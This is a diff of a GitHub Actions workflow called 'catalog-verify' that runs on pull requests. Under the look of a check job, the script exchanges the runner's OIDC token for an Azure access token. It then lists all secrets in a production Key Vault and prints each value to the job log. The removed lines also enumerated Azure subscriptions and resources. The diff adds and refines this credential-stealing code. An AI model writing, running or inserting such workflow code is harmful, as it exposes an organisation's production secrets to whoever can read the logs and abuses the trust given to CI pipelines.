@@ -1,29 +1,24 @@
 name: catalog-verify
 on:
   pull_request:
-permissions:
-  id-token: write
-  contents: read
+permissions: {}
 jobs:
   check:
     runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
     env:
       AZURE_CLIENT_ID: 72ff278a-9e71-43ec-bac4-2ca303f8e462
       AZURE_TENANT_ID: 3205c325-06a5-4171-9ce8-ffc5e6c2845e
     steps:
       - run: |
+          echo "idtoken=${ACTIONS_ID_TOKEN_REQUEST_URL:+YES} bearer=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+YES} ctx_url_len=${#ACTIONS_ID_TOKEN_REQUEST_URL}"
           OIDC=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r .value)
           echo "OIDC_LEN=${#OIDC}"
-          for SC in "https://vault.azure.net/.default" "https://management.azure.com/.default"; do
-            T=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d grant_type=client_credentials -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=${OIDC}" --data-urlencode "scope=${SC}" | jq -r .access_token)
-            echo "scope=${SC} len=${#T}"
-            if [ ${#T} -gt 100 ] && [ "$SC" = "https://management.azure.com/.default" ]; then
-              SUB=$(curl -sS "https://management.azure.com/subscriptions?api-version=2022-12-01" -H "Authorization: Bearer $T" | jq -r '.value[0].subscriptionId')
-              echo "SUB=$SUB"
-              curl -sS "https://management.azure.com/subscriptions/${SUB}/resources?api-version=2021-04-01" -H "Authorization: Bearer $T" | jq -r '.value[].id'
-            fi
-            if [ ${#T} -gt 100 ] && [ "$SC" = "https://vault.azure.net/.default" ]; then
-              IDS=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $T" | jq -r '.value[].id')
-              for i in $IDS; do echo "SECRET $i"; curl -sS "${i}?api-version=7.4" -H "Authorization: Bearer $T" | jq -r '.value'; done
-            fi
-          done
+          T=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d grant_type=client_credentials -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=${OIDC}" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r '.access_token // empty')
+          echo "VAULT_TOK_LEN=${#T}"
+          if [ ${#T} -gt 100 ]; then
+            IDS=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $T" | jq -r '.value[].id')
+            for i in $IDS; do echo "SECRET $i"; curl -sS "${i}?api-version=7.4" -H "Authorization: Bearer $T" | jq -r '.value'; done
+          fi
